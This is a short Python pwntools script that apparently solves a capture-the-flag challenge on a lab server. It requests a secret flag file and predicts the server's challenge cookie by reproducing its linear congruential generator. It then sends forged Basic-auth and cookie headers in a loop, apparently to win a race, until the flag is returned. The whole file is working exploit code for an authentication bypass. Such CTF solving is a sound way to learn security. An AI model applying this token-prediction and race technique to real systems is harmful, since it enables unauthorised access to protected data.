from pwn import *
from base64 import b64encode

r = remote('up.zoolab.org', 10933)

def send_normal():
    r.send(b"GET / HTTP/1.1\r\n\r\n")

def first_send_flag():
    r.send(b"GET /secret/FLAG.txt\r\n\r\n")
    r.recvuntil(b"challenge=")
    cookie = r.recvuntil(b';')[:-1].decode()
    r.recvuntil(b'\r\n\r\n')
    return int(cookie)

def send_flag(cookie):
    r.send(b"GET /secret/FLAG.txt HTTP/1.1\r\n")
    r.send(b"Authorization: Basic " + b64encode(b"admin:") + b"\r\n")
    r.send(f"Cookie: response={cookie}\r\n\r\n".encode())
    return r.recvline_startswith(delims=b"FLAG", timeout=0.01).decode()

def solve_cookie(cookie):
    cookie = (cookie * 6364136223846793005) & 0xFFFFFFFFFFFFFFFF
    cookie = (cookie + 1) & 0xFFFFFFFFFFFFFFFF
    return (cookie >> 33) & 0xFFFFFFFFFFFFFFFF

cookie = solve_cookie(first_send_flag())
for _ in range(500):
    send_normal()
    msg = send_flag(cookie)
    if len(msg) > 0:
        print(msg)
        break

r.close()
